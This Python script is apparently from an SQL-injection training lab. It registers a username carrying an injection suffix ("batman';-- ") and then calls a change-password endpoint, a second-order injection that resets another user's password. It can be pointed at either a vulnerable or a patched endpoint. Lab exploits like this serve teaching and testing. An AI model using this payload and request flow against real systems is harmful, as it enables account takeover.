import json
from typing import Any
from urllib.error import URLError
from urllib.request import Request, urlopen

import cli


def register(
    username_to_exploit: str, password: str, register_url: str
) -> dict[Any, Any]:
    username = f"{username_to_exploit}';-- "
    data = {"username": username, "password": password}

    try:
        req = Request(
            register_url,
            data=json.dumps(data).encode("utf-8"),
            method="POST",
            headers={"Content-Type": "application/json"},
        )

        with urlopen(req) as response:
            cookies = dict(
                [
                    cookie.split("=", 1)
                    for cookie in response.headers.get("Set-Cookie", "").split("; ")[
                        0:1
                    ]
                ]
            )
            print(f"Response: {response.read().decode('utf-8')}")
            return cookies
    except URLError as e:
        print(f"Error: {e}")
        return {}


def change_password(
    cookies: dict[Any, Any], password: str, change_password_url: str
) -> None:
    data = {"old": password, "new": password, "new_verify": password}

    try:
        cookie_string = "; ".join([f"{k}={v}" for k, v in cookies.items()])
        req = Request(
            change_password_url,
            data=json.dumps(data).encode("utf-8"),
            method="POST",
            headers={"Content-Type": "application/json", "Cookie": cookie_string},
        )

        with urlopen(req) as response:
            print(f"Response: {response.read().decode('utf-8')}")
    except URLError as e:
        print(f"Error: {e}")


def main(use_vulnerable_endpoint: bool, url_prefix: str) -> None:
    if use_vulnerable_endpoint:
        urls = [
            f"{url_prefix}/vulnerabilities/sqli2/register/",
            f"{url_prefix}/vulnerabilities/sqli2/change_password/",
        ]
    else:
        urls = [
            f"{url_prefix}/patches/sqli2/register/",
            f"{url_prefix}/patches/sqli2/change_password/",
        ]

    password = "gotham"
    username_to_exploit = "batman"
    cookies = register(username_to_exploit, password, urls[0])
    change_password(cookies, password, urls[1])


if __name__ == "__main__":
    use_vulnerable_endpoint, url_prefix = cli.get_cli_arguments()
    main(use_vulnerable_endpoint, url_prefix)
